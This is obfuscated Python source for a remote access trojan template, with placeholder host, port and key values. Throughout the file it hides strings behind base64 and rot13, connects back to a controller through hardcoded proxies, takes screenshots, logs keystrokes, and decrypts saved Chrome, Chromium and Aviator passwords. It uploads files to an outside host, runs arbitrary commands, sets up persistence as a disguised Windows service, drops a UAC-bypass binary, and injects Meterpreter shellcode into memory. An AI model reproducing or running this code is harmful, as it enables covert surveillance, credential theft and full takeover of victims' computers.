***JUNK***
def fscreenshot():
	hwnd = 0
	hwndDC = win32gui.GetWindowDC(hwnd)
	mfcDC = win32ui.CreateDCFromHandle(hwndDC)
	saveDC = mfcDC.CreateCompatibleDC()
	saveBitMap = win32ui.CreateBitmap()
	MoniterDev = win32api.EnumDisplayMonitors(None,None)
	w = MoniterDev[0][2][2]
	h = MoniterDev[0][2][3]
	saveBitMap.CreateCompatibleBitmap(mfcDC, w, h)
	saveDC.SelectObject(saveBitMap)
	saveDC.BitBlt((0,0),(w, h) , mfcDC, (0,0), win32con.SRCCOPY)
	bmpname=win32api.GetTempFileName(".","")[0] + funrot('Lm96Yw')
	saveBitMap.SaveBitmapFile(saveDC, bmpname)
	mfcDC.DeleteDC()
	saveDC.DeleteDC()
	win32gui.ReleaseDC(hwnd, hwndDC)
	win32gui.DeleteObject(saveBitMap.GetHandle())
	fsubprocess(funrot('cXJ5ICouZ3pj'))
	return bmpname

def fconnect():
	global s, success, i1II1iI1IIIiiil1l
	i1II1iI1IIIiiil1l = False
	if useproxy:
		while not i1II1iI1IIIiiil1l:
			for proxy in proxies:
				try:
					s = socks.socksocket()
					s.setproxy(socks.HTTP,proxy[0],proxy[1])
					s.settimeout(20)
					s.connect((host, port))
					success = funrot('VFJHIC8gVUdHQy8xLjENCg0K') + success
					i1II1iI1IIIiiil1l = True
					break
				except:
					pass
	else:
		while not i1II1iI1IIIiiil1l:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(20)
				s.connect((host, port))
				i1II1iI1IIIiiil1l = True
			except:
				pass
	s.send(success)
	s.settimeout(999)
	pwd = os.getcwd()
def fwget(l2cHJm):
	down = urllib2.urlopen(l2cHJm)
	filename = l2cHJm.split('/')[-1]
	with open(pwd.strip(funrot("DQ")) + sepvar + filename,'wb') as o:
		o.write(down.read())
def ftempsend(l2cHJmd):
	if sepvar not in l2cHJmd:
		l2cHJmd = pwd.strip(funrot("DQ")) + sepvar + l2cHJmd
	if not os.path.isfile(l2cHJmd):
		return funrot('IFtLXSBSZWViZSwgYWIgc3Z5ciBzYmhhcSBuZyA') + (l2cHJmd)
	with open(l2cHJmd, 'rb') as uf:
		r = requests.post(funrot('dWdnYzovL2dyemNmcmFxLnBiei9mcmFx'), data={funrot('cmtjdmVy'):'2678400'}, files={funrot('c3Z5cg'): uf})
	return funrot("IFsqXSA") + str(r.url)
def fpersist():
	vbscript = funrot('ZmduZ3IgPSAxCnV2cXFyYSA9IDAKamZ1YW56ciA9ICI') + agent + funrot('Igppb2ZhbnpyID0gIg') + vbsdst + funrot('IgpKdXZ5ciBmZ25nciA9IDEKcmt2ZmcgPSBFcmNiZWdTdnlyRmduZ2hmKGpmdWFuenIpClZzIHJrdmZnID0gR2VociBndXJhCmZyZyBib3dTRkIgPSBQZXJuZ3JCb3dycGcoIkZwZXZjZ3ZhdC5TdnlyRmxmZ3J6Qm93cnBnIikKZnJnIGJvd1N2eXIgPSBib3dTRkIuVHJnU3Z5cihqZnVhbnpyKQpmcmcgYm93U0ZCID0gUGVybmdyQm93cnBnKCJGcGV2Y2d2YXQuU3Z5ckZsZmdyekJvd3JwZyIpCmZyZyBib3dTdnlyID0gYm93U0ZCLlRyZ1N2eXIoaW9mYW56cikKRnJnIEpmdUZ1cnl5ID0gSkZwZXZjZy5QZXJuZ3JCb3dycGcgKCJKRnBldmNnLkZ1cnl5IikKRnJnIHBieUNlYnByZmZZdmZnID0gVHJnQm93cnBnKCJKdmF6dHpnZjoiKS5Sa3JwRGhyZWwgKCJGcnlycGcgKiBzZWJ6IEp2YTMyX0NlYnByZmYiKQpTYmUgUm5wdSBib3dDZWJwcmZmIHZhIHBieUNlYnByZmZZdmZnCnZzIGJvd0NlYnByZmYuYW56ciA9ICI') + agentname + funrot('IiBndXJhCmlTYmhhcSA9IEdlaHIKUmFxIHZzCkFya2cKVnMgaVNiaGFxID0gR2VociBndXJhCmpmcGV2Y2cuZnlycmMgNzAwMApSeWZyCkpmdUZ1cnl5LkVoYSAiIiI') + agent + funrot('IiIiLHV2cXFyYQpqZnBldmNnLmZ5cnJjIDcwMDAKUmFxIFZzCmlTYmhhcSA9IFNueWZyClJ5ZnIKamZwZXZjZy5meXJyYyA3MDAwClJhcSBWcwpKcmFxClNoYXBndmJhIEVyY2JlZ1N2eXJGZ25naGYoc3Z5cmZjcnApClF2eiBzZmIsIHpmdApGcmcgc2ZiID0gUGVybmdyQm93cnBnKCJGcGV2Y2d2YXQuU3Z5ckZsZmdyekJvd3JwZyIpClZzIChzZmIuU3Z5clJrdmZnZihzdnlyZmNycCkpIEd1cmEKemZ0ID0gR2VocgpSeWZyCnpmdCA9IFNueWZyClJhcSBWcwpFcmNiZWdTdnlyRmduZ2hmID0gemZ0ClJhcSBTaGFwZ3ZiYQo')
	with open(vbsdst, 'w') as pv:
		pv.write(vbscript)
	fsubprocess(funrot('bmdnZXZvICt1IA') + vbsdst)
	l12cHnnds = funrot('cGJjbCA') + sys.argv[0] + ' ' + agent + funrot("Cg")
	l12cHnnds += funrot('ZnAgcGVybmdyIA') + servicename + funrot('IG92YUNuZ3U9ICJwenEucmtyIC9wIGpmcGV2Y2cucmtyIA') + vbsdst + funrot('IiBnbGNyPSBiamEgZmduZWc9IG5oZ2IK')
	l12cHnnds += funrot('cXJ5IA') + tempvbs + funrot("Cg")
	l12cHnnds += funrot('ZnAgcXJmcGV2Y2d2YmEg') + servicename + ' ' + servicedisc + funrot("Cg")
	l12cHnnds += funrot('cXJ5IC9OVSAiJX5zMCIgJiBmcCBmZ25lZyA') + servicename + funrot("Cg")
	hb = funrot('UGVybmdyQm93cnBnKCJKZnBldmNnLkZ1cnl5IikuRWhhICIiIiIgJiBKRnBldmNnLk5ldGh6cmFnZigwKSAmICIiIiIsIDAsIFNueWZyCg')
	with open(tempvbs, 'w') as hid:
		hid.write(hb)
	with open(tempbat, 'w') as cbat:
		cbat.write(l12cHnnds)
	with open(datafile, 'wb') as df:
		df.write(persistinfo)
	fsubprocess(funrot('bmdnZXZvICt1IA') + tempvbs)
	fsubprocess(funrot('bmdnZXZvICt1IA') + tempbat)
	rl12cHnnd = tempvbs + ' ' + tempbat
	fbypass(rl12cHnnd)
	fsubprocess(funrot('Z25meHh2eXkgL3MgL3Z6IA') + sys.argv[0])
	sys.exit()
def funpersist():
	with open(datafile, 'rb') as f:
		settings = DecodeAES(cipher, f.read().strip(''))
		settings = settings[30:].split(funrot("Cg"))
	agentn = settings[0]
	vbsdstn = settings[1]
	fsubprocess(funrot('ZnAgcXJ5l12cHnndyIA') + servicename)
	with open(***ENV***(tempvvar) + funrot("XGgub25n"), 'w') as f:
		f.write(funrot('cXJ5IC9TIC9OVSA') + '%s**n' % vbsdstn)
		f.write(funrot('cXJ5IC9TIC9OVSA') + '%s**n' % agentn)
		f.write(funrot('cXJ5IC9TICIlfnMwIgo'))
	encrypted = EncodeAES(cipher, funrot('SkdTSkdTSkdTSkdTSkdTMUpHU0pHU0pHU0pHU0pHUzEgWypdIENyZWZ2ZmdyYXByIGhhdmFmZ255eXJxLgo'))
	s.send(encrypted)
	os.startfile(***ENV***(tempvvar) + sepvar + funrot('aC5vbmc'))
	sys.exit()
def fmeterdrop(l2cHmd, l2Hmd):
	try:
		global DropSock
		DropSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		DropSock.connect((l2cHmd, int(l2Hmd)))
		yWubQo = struct.pack('<i', DropSock.fileno())
		l = struct.unpack('<i', str(DropSock.recv(4)))[0]
		UDDvfkFdFXs = "     "
		while len(UDDvfkFdFXs) < l: UDDvfkFdFXs += DropSock.recv(l)
		HNzdFhkeybuffervICp = ctypes.create_string_buffer(UDDvfkFdFXs, len(UDDvfkFdFXs))
		HNzdFhkeybuffervICp[0] = binascii.unhexlify('BF')
		for i in xrange(4): HNzdFhkeybuffervICp[i+1] = yWubQo[i]
		return HNzdFhkeybuffervICp
	except: return None
def fexecinmem(l12cHmnd):
	if l12cHmnd != None:
		iNGRgaQLVJ = bytearray(l12cHmnd)
		imHlcWqpKVwgodv = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(iNGRgaQLVJ)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
		ctypes.windll.kernel32.VirtualLock(ctypes.c_int(imHlcWqpKVwgodv), ctypes.c_int(len(iNGRgaQLVJ)))
		DWsMxliK = (ctypes.c_char * len(iNGRgaQLVJ)).from_buffer(iNGRgaQLVJ)
		ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(imHlcWqpKVwgodv), DWsMxliK, ctypes.c_int(len(iNGRgaQLVJ)))
		ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(imHlcWqpKVwgodv),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
		ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
def frunthis(l12cHnnd):
	os.popen(l12cHnnd)
def fkeypress(l12cHnns):   
	global keydump
	if l12cHnns.Ascii:
		char = chr(l12cHnns.Ascii) 
		if l12cHnns.Ascii == 13:   
			keydump += funrot('Cg')
		elif l12cHnns.Ascii == 8:
			keydump += funrot('W09ucHhmY25wcl0')
		elif l12cHnns.Ascii == 9:
			keydump += funrot('W0dub10')
		elif l12cHnns.Ascii == 16:
			keydump += funrot('W0Z1dnNnXQ')
		elif l12cHnns.Ascii == 17:
			keydump += funrot('W1BiYWdlYnld')
		elif l12cHnns.Ascii == 27:
			keydump += funrot('W1JmcG5jcl0')
		elif l12cHnns.Ascii == 35:
			keydump += funrot('W1JhcV0')
		elif l12cHnns.Ascii == 36:
			keydump += funrot('W1VienJd')
		elif l12cHnns.Ascii == 37:
			 keydump += funrot('W1lyc2dd')
		elif l12cHnns.Ascii == 38:
			keydump += funrot('W0hDXQ')
		elif l12cHnns.Ascii == 39:
			keydump += funrot('W0V2dHVnXQ')
		elif l12cHnns.Ascii == 40:
			keydump += funrot('W1FiamFd')
		else:
			if char in string.printable:
				keydump += char
def fkeylog():
	proc = pyHook.HookManager()    
	proc.KeyDown = fkeypress
	proc.HookKeyboard()
	pythoncom.PumpMessages()
def fbypass(l12cHnnd):
	with open(bypassexe, 'wb') as uac:
		if is64:
			uac.write(***B64D***(bypass64exe))
		else:
			uac.write(***B64D***(bypass86exe))
	fsubprocess(funrot('bmdnZXZvICt1IA') + bypassexe)
	rl12cHnnd = bypassexe + funrot('IHJ5cmluZ3IgL3Ag') + l12cHnnd
	back = fsubprocess(rl12cHnnd)
	os.remove(bypassexe)
	os.remove(sepvar.join(bypassexe.split(sepvar)[:-1]) + sepvar + funrot('Z3ZiZS5ya3I'))
	return back
def funrot(l12cHnn5):
	while True:
		try:
			return str(***B64D***(l12cHnn5).decode(***B64D***('cm90MTNs')[:-1]))
			break
		except:
			l12cHnn5 += '='
def fsubprocess(l12cHnnd):
	if ushell:
		l12cHnnd = '''%s -c "%s"''' % (ushell, l12cHnnd)
	out = subprocess.Popen(l12cHnnd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	return out.stdout.read() + out.stderr.read()
def fremoteprint(l12cHon5):
	l12cHon5 = l12cHon5 + funrot('ClJCU1JCU1JCU1JCU1JCU0s')
	encrypted = EncodeAES(cipher, l12cHon5)
	s.send(encrypted)
host, port, secret = ***HOST***, ***PORT***, ***SECRET***
***64EXE***
***86EXE***
BLOCK_SIZE, PADDING, keydump = 32, '{', ''
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: ***B64E***(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(***B64D***(e))
iv = Random.new().read(***AES***.block_size)
cipher = ***AES***.new(secret,***AES***.MODE_CFB, iv)
MeterBin, DropSock = None, None
isAdmin, isSystem, is64, isWindows, ushell = False, False, False, False, False
pwd = os.getcwd()
opsys = platform.uname()[0] + ' ' + platform.uname()[2]
paddedopsys = opsys + funrot("Kg") * (64 - len(opsys))
starpadding = funrot("Kg") * 16
sepvar, eofv = os.sep, funrot("UkJDWQ")
if platform.machine()[-2:] == funrot("NjQ"):
	is64 = True
if os.name == funrot("YWc"):
	tempvvar, windirvar = funrot("R1JaQw"), funrot("SlZBUVZF")
	tempvbs = ***ENV***(tempvvar) + funrot('XHUuaW9m')
	tempbat = ***ENV***(tempvvar) + funrot('XHAub25n')
	bypassexe = ***ENV***(tempvvar) + funrot('XGZpcHViZmcucmty')
	agent = ***ENV***(windirvar) + funrot('XFZaUlx2enJ4ZThccXZwZ2ZcSnZhWnJxdm4ucmty')
	agentname = agent.split(sepvar)[-1]
	vbsdst = ***ENV***(funrot("TkNDUU5HTg")) + funrot('XC4uXFlicG55XEp2YXFiamZacnF2bkhjcW5nci5pb2Y')
	servicename = funrot('Ikp2YXFiamYgWnJxdm4gUHJhZ3JlIEhjcW5nciBGcmVpdnByIg')
	servicedisc = funrot('Ikp2YXFiamYgWnJxdm4gUHJhZ3JlIEhjcW5nciBGcmVpdnByIHNiZSB2YWZnbnl5bmd2YmEsIHpicXZzdnBuZ3ZiYSwgbmFxIGVyemJpbnkgYnMgSnZhcWJqZiBoY3FuZ3JmIG5hcSBiY2d2YmFueSBwYnpjYmFyYWdmLiBWcyBndXZmIGZyZWl2cHIgdmYgcXZmbm95cnEsIHZhZmdueXkgYmUgaGF2YWZnbnl5IGJzIEp2YXFiamYgaGNxbmdyZiB6dnR1ZyBzbnZ5IHNiZSBndXZmIHBiemNoZ3JlLiI')
	proxyfile = ***ENV***(tempvvar) + funrot('XGt6eWVjcC5xbmc')
	datafile = ***ENV***(windirvar) + funrot('XEdyemNcanZhZW5hcS5xbmc')
	pwdvar = funrot('cHE')
	isWindows = True
	paddedpwd = pwd.strip(funrot("DQ")) + funrot("Kg") * (64 - len(pwd.strip(funrot("DQ"))))
	adm = fsubprocess(funrot('anVibnp2')).strip(funrot("Cg")).strip(funrot("DQ"))
	stdout = fsubprocess(funrot('YXJnIHlicG55dGViaGMgbnF6dmF2ZmdlbmdiZWYgfCBzdmFxICIlSEZSRUFOWlIlIg')).strip(funrot("Cg")).strip(funrot("DQ"))
	persistinfo = EncodeAES(cipher, funrot("Kg") * 30 + '%s**n%s**n%s**n%s**n%s' % (agent, vbsdst, servicename, proxyfile, tempvbs))
	if stdout != '':
		isAdmin = True
	if adm.lower() == funrot('YWcgbmhndWJldmdsXGZsZmdyeg'):
		isSystem = True
	if isSystem:
		try:
			fsubprocess(funrot('bmdnZXZvICt1IA') + agent)
		except:
			pass
***PERSIST***
	if is64:
		if isSystem:
			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOSY%s%s' % (paddedopsys, paddedpwd, starpadding))
		else:
			if isAdmin:
				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOAY%s%s' % (paddedopsys, paddedpwd, starpadding))
			else:
				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOFY%s%s' % (paddedopsys, paddedpwd, starpadding))
	else:
		if isSystem:
			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOSH%s%s' % (paddedopsys, paddedpwd, starpadding))
		else:
			if isAdmin:
				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOAH%s%s' % (paddedopsys, paddedpwd, starpadding))
			else:
				success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOFH%s%s' % (paddedopsys, paddedpwd, starpadding))
elif os.name == funrot('Y2Jmdms'):
	if os.getuid() == 0:
		isSystem = True
	pwdvar = funrot('Y2px')
	ushell = ***ENV***(funrot("RlVSWVk"))
	paddedpwd = pwd + funrot("Kg") * (64 - len(pwd))
	if isSystem:
		if is64:
			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFESLY%s%s' % (paddedopsys, paddedpwd, starpadding))
		else:
			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFESLH%s%s' % (paddedopsys, paddedpwd, starpadding))
	else:
		if is64:
			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLY%s%s' % (paddedopsys, paddedpwd, starpadding))
		else:
			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOLH%s%s' % (paddedopsys, paddedpwd, starpadding))
else:
	pwdvar = funrot('Y2px')
	paddedpwd = pwd + funrot("Kg") * (64 - len(pwd))
	success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOUH%s%s' % (paddedopsys, paddedpwd, starpadding))
try:
	proxies = []
	with open(proxyfile) as pl:
		decpl = DecodeAES(cipher, pl.read())
	for line in decpl.split(funrot("Cg")):
		proxies.append([line.split(funrot("Og"))[0], int(line.split(funrot("Og"))[1])])
except:
	proxies = [["37.187.58.37", 3128], ["188.40.252.215", 7808], ["65.49.14.147", 3080], ["188.40.252.215", 3127], ["64.31.22.143", 8089],
			  ["108.165.33.7", 3128], ["108.165.33.12", 3128], ["104.140.67.36", 8089], ["108.165.33.4", 3128]]
***PROXY***
fconnect()
while True:
	try:
		data = s.recv(8192)
		decrypted = DecodeAES(cipher, data)
	except:
		fconnect()
		decrypted = funrot('cWJhbmh0dWc')
	if decrypted == funrot('ZGh2Zw') or decrypted == funrot('cmt2Zw'):
		s.close()
		sys.exit()
	elif decrypted == funrot('cWJhbmh0dWc'):
		pass
	elif decrypted.startswith(funrot('ZnBlcnJhZnViZw')):
		upfile = fscreenshot()
		with open(upfile, 'rb') as f:
			encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFSEOFEOFEOFEOFEOFS" + f.read() + "EOFEOFEOFEOFEOFZEOFEOFEOFEOFEOFZ")
		s.send(encrypted)
		os.remove(upfile)
	elif decrypted.startswith(funrot('Z3J6Y2ZyYXEg')):
		fremoteprint(ftempsend(decrypted.split(' ')[1]))
	elif decrypted.startswith(funrot('Y2Via2xoY3FuZ3I')):
		proxlist = decrypted[11:]
		if decrypted.endswith(eofv):
			proxlist = proxlist[:-4]
		else:
			while not decrypted.endswith(eofv):
				data = s.recv(8192)
				decrypted = DecodeAES(cipher, data)
				if decrypted.endswith(eofv):
					proxlist += decrypted[:-4]
					break
				else:
					proxlist += decrypted
		with open(proxyfile, 'wb') as pl:
			pl.write(EncodeAES(cipher, proxlist))
		encrypted = EncodeAES(cipher, funrot('SkdTSkdTSkdTSkdTSkdTMUpHU0pHU0pHU0pHU0pHUzEgWypdIEFyaiBjZWJrbCB5dmZnIGZnYmVycSBuZyA') + '%s**n' % (proxyfile))
		s.send(encrypted)
		fsubprocess(funrot('bmdnZXZvICt1IA') + proxyfile)
	elif decrypted.startswith(funrot('cHVlYnpyY25mZg')):
		if pwdvar == funrot('cHE'):
			sendpass = ''
			appdata = ***ENV***(funrot("TkNDUU5HTg"))
			paths = []
			chromepath = appdata + funrot('XC4uXFlicG55XFRiYnR5clxQdWVienJcSGZyZSBRbmduXFFyc25oeWdcWWJ0dmEgUW5nbg')
			chromiumpath = appdata + funrot('XC4uXFlicG55XFB1ZWJ6dmh6XEhmcmUgUW5nblxRcnNuaHlnXFlidHZhIFFuZ24')
			aviatorpath = appdata + funrot('XC4uXFlicG55XE5pdm5nYmVcSGZyZSBRbmduXFFyc25oeWdcWWJ0dmEgUW5nbg')
			if os.path.isfile(chromepath):
				paths.append([chromepath, funrot('UHVlYnpy')])
			if os.path.isfile(chromiumpath):
				paths.append([chromiumpath, funrot('UHVlYnp2aHo')])
			if os.path.isfile(aviatorpath):
				paths.append([aviatorpath, funrot('Tml2bmdiZQ')]) 
			if len(paths) > 0:
				sendit = ''
				for passpath in paths:
					sendpass = ''
					connection = sqlite3.connect(passpath[0])
					cursor = connection.cursor()
					cursor.execute(funrot('RlJZUlBHIGJldnR2YV9oZXksIG5wZ3ZiYV9oZXksIGhmcmVhbnpyX2lueWhyLCBjbmZmamJlcV9pbnlociBTRUJaIHlidHZhZg'))
					for information in cursor.fetchall():
						passw = win32crypt.CryptUnprotectData(information[3], None, None, None, 0)[1]
						if passw:
							sendpass += funrot('IFsqXSBKcm9mdmdyLWJldnR2YTog') + information[0]
							sendpass += funrot('CiBbKl0gSnJvZnZnci1ucGd2YmE6IA') + information[1]
							sendpass += funrot('CiBbKl0gSGZyZWFuenI6IA') + information[2]
							sendpass += funrot('CiBbKl0gQ25mZmpiZXE6IA') + passw + funrot("Cg")
					if sendpass:
						sendit += funrot('CiBbKl0gQ25mZmpiZXFmIHNiaGFxIHNiZSA') + '%s:**n' % (passpath[1])
						sendit += sendpass
					else:
						sendit += funrot('CiBbS10gQWIgY25mZmpiZXFmIHNiaGFxIHNiZSA') + '%s.**n' % (passpath[1])
				fremoteprint(sendit)
			else:
				fremoteprint(funrot('IFtLXSBQdWVienIsIFB1ZWJ6dmh6IG5hcSBOaXZuZ2JlIG5lciBhYmcgdmFmZ255eXJxLg'))
		else:
			fremoteprint(funrot('IFtLXSBSZWViZTogcHVlYnpyY25mZiBwYnp6bmFxIHZmIGJheWwgbmludnlub3lyIGJhIGp2YXFiamYu'))
	elif decrypted.startswith(funrot('eHJscWh6Yw')):
		fremoteprint(keydump)
	elif decrypted.startswith(funrot('eHJsZnBuYQ')):
		kl = threading.Thread(target = fkeylog)
		kl.start()
		fremoteprint(funrot('IFsqXSBYcmx5YnR0dmF0IGZnbmVncnEu'))
	elif decrypted.startswith(funrot('eHJscHlybmU')):
		fremoteprint(keydump + funrot('CiBbKl0gWHJsb2hzc3JlIHB5cm5lcnEu'))
		keydump = ''
	elif decrypted.startswith(funrot('enJncmVjZXJncmUg')):
		try:
			l2cHmd,l2Hmd = decrypted.split(' ')[1].split(funrot("Og"))
			MeterBin = fmeterdrop(l2cHmd, l2Hmd)
			fremoteprint(funrot('IFsqXSBal12cHnndyZWNll12cHnndyZSBlcmlyZWZyX2dwYyBmcmFnIGdiIA') + "%s:%s" % (l2cHmd, l2Hmd))
			t = threading.Thread(target = fexecinmem, args = (MeterBin , ))
			t.start()
		except:
			fremoteprint(funrot('IFtLXSBTbnZ5cnEgZ2IgeWJucSB6l12cHnndyZWNll12cHnndyZS4qKmEgICByLnQ6IHpyZ3JlY2VyZ3JlIDE5Mi4xNjguMS4yMDo0NDQ0'))
	elif decrypted.startswith(funrot('Y3JlZnZmZ3JhcHI')):
		if os.name == funrot('YWc'):
			if isAdmin and platform.uname()[2] == funrot("Nw"):
				if not os.path.isfile(datafile):
					fpersist()
				else:
					fbypass(funrot('ZnAgZmduZWcg') + servicename)
			else:
				vulnpaths = ''
				winservices = fsubprocess(funrot("c2JlIC9zICJnYnhyYWY9MiBxcnl2emY9Jz0nIiAlbiB2YSAoJ2p6dnAgZnJlaXZwciB5dmZnIHNoeXlefHN2YXEgL3YgImNuZ3VhbnpyIl58c3ZhcSAvdiAvaSAiZmxmZ3J6MzIiJykgcWIgQHJwdWIgJW4"))
				for line in winservices.split(funrot("Cg")):
					if line:
						if line[0] == '"':
							line = '"' + line.split('"')[1].strip(funrot("DQ")) + '"'
						else:
							line = '"' + line.split('/')[0].strip(funrot("DQ")) + '"'
						out = fsubprocess(funrot('dnBucHlmIA') + line)
						if out.find(funrot('T0hWWUdWQVxIZnJlZjooVikoUyk')) != -1 or out.find(funrot('T0hWWUdWQVxIZnJlZjooUyk')) != -1:
							vulnpaths += line + funrot("Cg")
				if vulnpaths:
					fremoteprint(funrot('IFsqXSBKdmFxYmpmIGZyZWl2cHJmIGp2Z3UganJueCBxdmVycGdiZWwgY3JlenZmZnZiYWY6Cgo') + vulnpaths)
				else:
					fremoteprint(funrot('IFtLXSBBYiBmcmVpdnByZiBqdmd1IGpybnggcXZlcnBnYmVsIGNyZXp2ZmZ2YmFmIHNiaGFxLg'))
		else:
			fremoteprint(funrot('IFtLXSBDcmVmdmZncmFwciB2ZiBiYXlsIG5pbnZ5bm95ciBzYmUganZhcWJqZi4'))
	elif decrypted.startswith(funrot("aGFjcmVmdmZn")):
		if not os.path.isfile(datafile):
			fremoteprint(funrot('IFtLXSBDcmVmdmZncmFwciBxYnJmIGFiZyBuY2NybmUgZ2Igb3IgdmFmZ255eXJxLg'))
		else:
			funpersist()
	elif decrypted.startswith(funrot('b2xjbmZmaG5wIA')):
		l12cHnnds = ' '.join(decrypted.split(' ')[1:])
		out = fbypass(l12cHnnds)
		encrypted = EncodeAES(cipher, 'WTFWTFWTFWTFWTF1WTFWTFWTFWTFWTF1%s' % (out))
		s.send(encrypted)
	elif decrypted.startswith(funrot('cWJqYXlibnEg')):
		if decrypted.split(' ')[1].find(sepvar) == -1:
			downpath = pwd.strip(funrot("DQ")) + sepvar + decrypted.split(' ')[1]
		else:
			downpath = decrypted.split(' ')[1]
		with open(downpath, 'rb') as f:
			encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFSEOFEOFEOFEOFEOFS" + f.read() + "EOFEOFEOFEOFEOFZEOFEOFEOFEOFEOFZ")
		s.send(encrypted)
	elif decrypted.startswith(funrot('anRyZyA')):
		try:
			url = decrypted.split(' ')[1]
			fwget(url)
			fremoteprint(" [*] " + url.split('/')[-1] + funrot('IHFiamF5Ym5xcnEu'))
		except:
			fremoteprint(funrot('IFtLXSBQYmh5cSBhYmcgcWJqYXlibnEg') + url)
	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):
		try:
			ufilename = pwd.strip(funrot("DQ")) + sepvar + decrypted[32:48].strip(funrot("Kg"))
			decrypted = decrypted[48:]
			with open(ufilename, 'wb') as f:
				if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
					decrypted = decrypted[:-32]
					f.write(decrypted)
				else:
					f.write(decrypted)
					while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
						data = s.recv(8192)
						decrypted = DecodeAES(cipher, data)
						if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
							f.write(decrypted[:-32])
						else:
							f.write(decrypted)
			fremoteprint(funrot('IFsqXSBTdnlyIGhjeWJucXJxIGdiIA') + ufilename)
		except Exception as e:
			fremoteprint(funrot('IFsqXSBGYnpyZ3V2YXQganJhZyBqZWJhdDog') + str(e))
	elif decrypted.startswith(funrot('ZWhhIA')):
		l12cHnnd = funrot('cHEg') + pwd + '&&' + ' '.join(decrypted.split(' ')[1:]) 
		t = threading.Thread(target = frunthis, args = (l12cHnnd , ))
		t.start()
		fremoteprint(funrot('IFsqXSBSa3JwaGdycSAi') + ' '.join(decrypted.split(' ')[1:]) + '" in ' + pwd)
	else:
		for char in decrypted:
			if char not in string.printable:
				encrypted = EncodeAES(cipher, starpadding * 3 + '^^')
				s.send(encrypted)
				decrypted = funrot('cWJhbmh0dWc')
				break
		if decrypted != funrot('cWJhbmh0dWc'):
			l12cHnnd = funrot('cHEg') + '%s&&%s&&%s' % (pwd, decrypted, pwdvar)
			stdout = fsubprocess(l12cHnnd)
			try:
				checkpath = stdout.split(funrot("Cg"))[-2].strip(funrot("Cg")).strip(funrot("DQ"))
				if os.path.exists(checkpath):
					pwd = checkpath
			except:
				pass
			result = funrot("Cg").join(stdout.split(funrot("Cg"))[:-1])
			try:
				fremoteprint(result)
			except:
				fconnect()
s.close()
***JUNK2***